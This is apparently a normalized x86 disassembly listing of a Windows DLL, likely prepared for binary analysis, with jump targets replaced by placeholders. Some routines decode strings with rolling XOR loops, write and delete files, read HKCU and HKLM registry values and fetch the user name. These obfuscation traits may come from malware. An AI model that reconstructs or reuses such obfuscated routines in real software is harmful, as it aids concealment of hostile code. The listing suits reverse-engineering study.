lea edi [ ebp - 0x4 ]
mov edx 0x104
mov ecx ebx
call sub_100727a0
test eax eax
js r-xdata
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax 0x104
sub eax ecx
push esi
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072800
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x104
sub eax ecx
push esi
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072800
test eax eax
mov edx [ ebp + 0x18 ]
test edx edx
je r-xdata
pop edi
pop esi
mov eax 0x6
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
pop edi
pop esi
mov eax 0x4
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea ecx [ ebp + 0xc ]
push ecx
call sub_10065cb8
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
call sub_1004e6c0
test eax eax
je r-xdata
mov eax edx
lea esi [ eax + 0x2 ]
mov eax edx
lea esi [ eax + 0x2 ]
cmp [ ebp + 0x10 ] 0x0
je r-xdata
pop edi
pop esi
mov eax 0x8
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp + 0xc ]
push edx
call sub_10065cb8
mov esi [ ebp + 0xc ]
mov eax 0xcccccccd
mul esi
shr edx 0x3
imul edx edx 0xfffffff6
add esi edx
mov edx [ ebp + 0x1c ]
add esp 0x4
mov [ ebp + 0xc ] esi
test edx edx
je r-xdata
push edx
mov esi 0x104
call sub_1004e6c0
test eax eax
je r-xdata
push edx
mov esi 0x104
call sub_1004e6c0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
imul esi esi 0x208
mov ecx [ eax + 0x120 ]
lea edx [ esi + ecx + 0x1451c ]
push edx
mov esi 0x104
call sub_1004e6c0
test eax eax
je r-xdata
mov eax edx
lea edi [ eax + 0x2 ]
mov edi edi
pop edi
pop esi
mov eax 0x7
pop ebx
mov esp ebp
pop ebp
retn 0x18
pop edi
pop esi
mov eax 0x5
pop ebx
mov esp ebp
pop ebp
retn 0x18
pop edi
pop esi
mov eax 0xa
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
je r-xdata
push edx
mov esi 0x104
call sub_1004e6c0
test eax eax
je r-xdata
mov esi [ ebp + 0xc ]
pop edi
pop esi
mov eax 0x9
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_1006728f
push 0x20
mov eax sub_10085dd4
call sub_1003fae8
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1006b91f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1007084d
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_1003c519
mov eax edi
call sub_1004642f
retn 0x24
sub_1006730e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10071ca2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10067335
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_10083b45
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_10083bd3
push eax
mov [ ebp - 0xc ] eax
call sub_100029fd
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_10067650
push ebp
mov ebp esp
push 0xffffffff
push sub_10088bf2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x398
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x384 ] eax
xor ebx ebx
mov [ ebp - 0x388 ] ebx
mov eax 0x1
mov [ ebp - 0x38c ] eax
mov [ ebp - 0x390 ] eax
xor eax eax
mov esi edx
movzx edx ax
mov eax edx
mov [ ebp - 0x39c ] ecx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x2ec ]
[ edi ]
push ebx
xor eax eax
push r--data
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x398 ] esi
mov [ ebp - 0x3a0 ] ebx
mov [ ebp - 0x37c ] ebx
mov [ ebp - 0x394 ] ebx
mov [ ebp - 0x2f4 ] 0x7
mov [ ebp - 0x2f8 ] ebx
mov [ ebp - 0x308 ] ax
call sub_1005ddc0
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
push esi
mov [ ebp - 0x4 ] ebx
call [ CreateFileW@IAT ]
mov [ ebp - 0x388 ] eax
cmp eax ebx
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
lea ecx [ ecx ]
push 0x1
lea ecx [ ebx + 0x1 ]
lea esi [ ebp - 0x35c ]
call sub_10056d40
add esp 0x4
push eax
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x1
call sub_100649e0
mov edi 0x8
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x348 ] edi
jb r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0x9d
inc cl
mov [ ebp + eax - 0x380 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x37e ] bl
xor eax eax
lea esp [ esp ]
mov esi [ ebp - 0x384 ]
lea eax [ ebp - 0x308 ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] dx
call sub_100649e0
cmp [ ebp - 0x2f4 ] edi
jb r-xdata
mov ecx [ ebp - 0x35c ]
push ecx
call sub_100187af
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x94
inc cl
mov [ ebp + eax - 0xe4 ] dl
movzx eax cl
cmp eax 0x6f
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x75 ] bl
xor eax eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x308 ]
push ecx
jmp r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0xe7
inc cl
mov [ ebp + eax - 0x5c ] dl
movzx eax cl
cmp eax 0x19
jb r-xdata
lea eax [ ebp - 0x380 ]
mov [ ebp - 0x43 ] bl
mov [ ebp - 0x32c ] 0xf
mov [ ebp - 0x330 ] ebx
mov [ ebp - 0x340 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x380 ]
push eax
lea ecx [ ebp - 0x340 ]
call sub_10037e00
lea ecx [ ebp - 0x340 ]
push ecx
lea edx [ ebp - 0xe4 ]
push edx
lea eax [ ebp - 0x35c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10057800
add esp 0xc
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0x3
call sub_10035980
add esp 0x4
mov edi 0x10
cmp [ ebp - 0x348 ] edi
jb r-xdata
mov esi 0xf
mov [ ebp - 0x348 ] esi
mov [ ebp - 0x34c ] ebx
mov [ ebp - 0x35c ] bl
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x32c ] edi
jb r-xdata
mov ecx [ ebp - 0x35c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x32c ] esi
mov esi [ ebp - 0x310 ]
cmp esi edi
mov edi [ ebp - 0x324 ]
mov [ ebp - 0x330 ] ebx
mov [ ebp - 0x340 ] bl
mov eax edi
jae r-xdata
mov edx [ ebp - 0x340 ]
push edx
call sub_100187af
add esp 0x4
lea edx [ eax + 0x1 ]
mov edi edi
lea eax [ ebp - 0x324 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov ecx edi
cmp esi 0x10
jae r-xdata
mov esi [ ebp - 0x388 ]
push ebx
lea edx [ ebp - 0x3a4 ]
push edx
push eax
push ecx
push esi
call [ WriteFile@IAT ]
push esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0x324 ]
call [ CloseHandle@IAT ]
lea esi [ ebp - 0x394 ]
lea ebx [ ebp - 0x37c ]
mov edx 0x80000001
call sub_100233d0
test eax eax
jne r-xdata
call [ CloseHandle@IAT ]
push 0x1
mov ecx 0x1
lea esi [ ebp - 0x378 ]
call sub_10056d40
add esp 0x4
push eax
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x7
call sub_100649e0
mov edi 0x8
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x364 ] edi
jb r-xdata
lea esi [ ebp - 0x394 ]
lea ebx [ ebp - 0x37c ]
mov edx 0x80000002
call sub_100233d0
test eax eax
jne r-xdata
mov esi [ ebp - 0x37c ]
mov eax esi
lea edx [ eax + 0x2 ]
mov esi [ ebp - 0x384 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
lea edx [ ebp - 0x308 ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_100649e0
cmp [ ebp - 0x310 ] 0x10
jb r-xdata
mov eax [ ebp - 0x378 ]
push eax
call sub_100187af
add esp 0x4
lea edx [ ebp - 0x370 ]
mov eax 0xc4
call sub_10045930
mov eax edx
xor esi esi
mov esi [ ebp - 0x37c ]
mov eax esi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea edx [ eax + eax ]
push edx
lea eax [ ebp - 0x2ec ]
push esi
push eax
call sub_1007f5d0
add esp 0xc
push esi
call [ CharUpperW@IAT ]
jmp r-xdata
mov [ ebp - 0x310 ] 0xf
mov [ ebp - 0x314 ] ebx
mov [ ebp - 0x324 ] bl
cmp [ ebp - 0x2f4 ] edi
jb r-xdata
mov eax [ ebp - 0x324 ]
push eax
call sub_100187af
add esp 0x4
mov edx [ ebp - 0x398 ]
push edx
call [ DeleteFileW@IAT ]
mov esi [ ebp - 0x384 ]
lea ecx [ ebp - 0x308 ]
xor eax eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov ecx esi
mov [ esi ] ax
call sub_100649e0
cmp [ ebp - 0x310 ] 0x10
jb r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea ecx [ eax + eax ]
push ecx
lea edx [ ebp - 0x2ec ]
push esi
push edx
call sub_1007f5d0
add esp 0xc
push esi
call [ CharUpperW@IAT ]
jmp r-xdata
mov [ ebp - 0x37c ] eax
lea edx [ ebp - 0x70 ]
mov eax 0xc4
call sub_10045930
lea edx [ ebp - 0x30 ]
mov eax 0x70
call sub_10045930
lea edx [ ebp - 0x20 ]
mov eax 0x146
call sub_10045930
lea edx [ ebp - 0x40 ]
mov eax 0x2d
call sub_10045930
mov ecx edx
push ecx
lea edx [ ebp - 0x20 ]
push edx
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x70 ]
push ecx
lea edx [ ebp - 0x308 ]
push edx
lea eax [ ebp - 0x2ec ]
push eax
lea ecx [ ebp - 0x37c ]
push ecx
lea edx [ ebp - 0x390 ]
push edx
lea eax [ ebp - 0x39c ]
push eax
lea edx [ ebp - 0x38c ]
lea ecx [ ebp - 0x398 ]
call sub_1003d730
lea ecx [ ebp - 0x38c ]
add esp 0x24
push ecx
lea ebx [ ebp - 0x308 ]
lea ecx [ ebp - 0x390 ]
call sub_10016360
xor ebx ebx
add esp 0x4
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x308 ]
push ecx
jmp r-xdata
cmp [ ebp - 0x2f4 ] 0x8
mov [ ebp - 0x310 ] 0xf
mov [ ebp - 0x314 ] ebx
mov [ ebp - 0x324 ] bl
jb r-xdata
mov edx [ ebp - 0x324 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x308 ]
push eax
sub_10067c00
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x80 ]
call eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x88 ]
push edi
push eax
call edx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x70 ]
push 0x2000
push eax
call edx
lea eax [ ebp - 0x210 ]
push eax
lea ecx [ ebp - 0x20c ]
push ecx
mov [ ebp - 0x210 ] 0x208
call [ GetUserNameW@IAT ]
mov eax [ esi + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x78 ]
push 0x0
lea ecx [ ebp - 0x20c ]
push ecx
push eax
call edx
mov [ esi ] eax
test eax eax
jns r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_10067cb0
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10067d3a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004b891
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10067d90
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
add eax [ ebx + 0x4 ]
push edi
mov edi ecx
cmp edi eax
jae r-xdata
cmp edi ecx
je r-xdata
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov ecx [ esi + 0x4 ]
mov eax [ ebx ]
add ecx [ esi ]
push edx
push eax
push ecx
call sub_1007f5d0
mov edx [ ebx + 0x4 ]
add esp 0xc
add [ esi + 0x4 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push edi
push eax
call sub_1006ee90
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ecx
mov ebx eax
push edx
push ebx
call sub_1007f5d0
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10021f70
mov [ esi ] ebx
mov ebx [ ebp + 0xc ]
add esp 0x1c
mov [ esi + 0x8 ] edi
add edi edi
cmp edi eax
jb r-xdata
sub_10067e0a
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_1000831a
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
push 0x0
push edi
mov ecx esi
call sub_1001eb83
test al al
je r-xdata
pop edi
push [ ebp + 0xc ]
mov ecx esi
push ebx
push [ esi + 0x10 ]
call sub_10033309
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10067ea0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0xc ] eax
call sub_1007f5d0
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0xc ] 0x0
sub_10067edc
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_100224ad
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_1003cbb0
sub_10067f24
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_1007fa90
pop ecx
mov edi eax
jmp r-xdata
call sub_10013c7e
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_1007fa90
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_10049c9d
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_10067fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086b78
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0xec ] bl
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
mov ecx esi
call sub_10069020
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0xc0 ] ebx
mov eax [ esi + 0xbc ]
cmp eax ebx
je r-xdata
push eax
mov eax [ esi + 0xd4 ]
call eax
mov [ esi + 0xb8 ] ebx
mov ecx [ esi + 0xd4 ]
push eax
call ecx
mov [ esi + 0xbc ] ebx
sub_10068070
push ebp
mov ebp esp
push ecx
push esi
add eax 0x18
mov esi ecx
push eax
mov [ ebp - 0x4 ] 0x0
call sub_10058e00
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_1006808e
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_10067e0a
push 0xffffffff
push eax
call sub_10071c21
jmp r-xdata
pop ebp
retn 0x8
sub_100680b6
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_100680e0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10069020
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10068101
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_100079d1
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10068152
push 0x34
mov eax sub_10085b1a
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x3c ] edi
add edi 0x8
push edi
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] eax
call sub_100578b0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
movzx ebx ax
jb r-xdata
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x34 ] 0x0
call sub_100578b0
add esp 0xc
cmp [ esi ] ax
jne r-xdata
mov esi [ esi ]
movzx eax [ esi ]
cmp bx ax
ja r-xdata
mov [ ebp - 0x34 ] 0x1
add esi 0x2
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10065800
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
lea ecx [ ebx + 0x9 ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x40 ] esp
push eax
call sub_10070f60
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x3c ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x30 ]
call sub_1002f578
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10063060
mov eax [ ebp - 0x30 ]
call sub_1004642f
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10046e20
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_10068229
mov edi edi
push esi
push 0x4
push 0x20
call sub_10067d3a
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_10068263
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_100578b0
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_100578b0
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_100578b0
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_100578b0
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_100578b0
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
push 0x2
cmp eax ebx
mov [ ebp - 0x4 ] eax
pop ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] ebx
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
